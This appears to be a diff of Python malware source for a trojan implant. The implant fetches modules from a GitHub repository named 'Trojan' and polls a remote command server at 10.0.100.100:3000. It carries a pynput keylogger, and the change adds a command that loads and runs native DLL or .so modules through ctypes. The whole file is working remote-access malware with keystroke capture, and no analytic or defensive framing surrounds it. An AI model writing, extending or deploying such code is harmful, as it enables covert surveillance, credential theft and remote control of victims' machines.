@@ -8,9 +8,11 @@ import threading
 import time
 import subprocess
 import requests
+import ctypes
 from datetime import datetime
 from pynput import keyboard  # Added for keylogger
 
+# Define a function to connect to GitHub
 def github_connect():
     with open('secret.txt') as f:
         token = f.read().strip()
@@ -18,6 +20,7 @@ def github_connect():
     sess = github3.login(token=token)
     return sess.repository(user, 'Trojan')
 
+# Define a function to get file contents from GitHub
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
 
@@ -38,6 +41,7 @@ class Keylogger:
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
 
+# Trojan class definition
 class Trojan:
     def __init__(self, id, node_server_url):
         self.id = id
@@ -114,8 +118,12 @@ class Trojan:
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
-            elif command_type == 'keylogger':  # Added keylogger command handling
+            elif command_type == 'keylogger':
                 self.start_keylogger()
+            elif command_type == 'c_module':
+                module_name = command.get('module')
+                if module_name:
+                    self.run_c_module(module_name)
         else:
             print(f"Invalid command format: {command}")
 
@@ -133,7 +141,24 @@ class Trojan:
         keylogger = Keylogger()
         keylogger_thread = threading.Thread(target=keylogger.run)
         keylogger_thread.start()
-        print("[*] Keylogger started.")  # Debug output
+        print("[*] Keylogger started.")
+
+    def load_c_module(self, module_name):
+        if os.name == 'nt':  # Windows
+            return ctypes.CDLL(f"{module_name}.dll")
+        else:  # Linux
+            return ctypes.CDLL(f"./{module_name}.so")
+
+    def run_c_module(self, module_name):
+        try:
+            c_module = self.load_c_module(module_name)
+            # Assuming the C module has a function named 'run'
+            run_func = c_module.run
+            run_func.restype = ctypes.c_char_p
+            result = run_func()
+            print(result.decode())
+        except Exception as e:
+            print(f"Error running C module {module_name}: {e}")
 
     def run(self):
         while self.running:
@@ -178,3 +203,4 @@ if __name__ == '__main__':
     NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
     trojan = Trojan('abc', NODE_SERVER_URL)
     trojan.run()
+
